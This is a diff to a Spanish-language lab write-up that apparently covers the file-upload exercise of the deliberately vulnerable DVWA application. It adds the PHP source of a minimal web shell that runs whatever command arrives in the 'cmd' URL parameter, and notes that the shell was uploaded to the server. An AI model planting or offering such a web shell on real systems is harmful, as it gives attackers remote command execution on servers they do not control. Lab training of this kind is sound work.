@@ -260,7 +260,15 @@ Surname:
 
 Vamos a crear una consola de comandos mediante php y usaremos la url para introducir los comandos, primero, crearemos dicha consola y la subiremos:
 
-# PONER EL CONTENIDO DE consola.php CUANDO SE SUBA A GITHUB, WINDWOS DEFENDER ME BLOQUEA MI ARCHIVO dvwa.md POR ELLO
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+```
 
 Nos dice que se ha subido correctamente: `../../hackable/uploads/consola.php succesfully uploaded!`
 
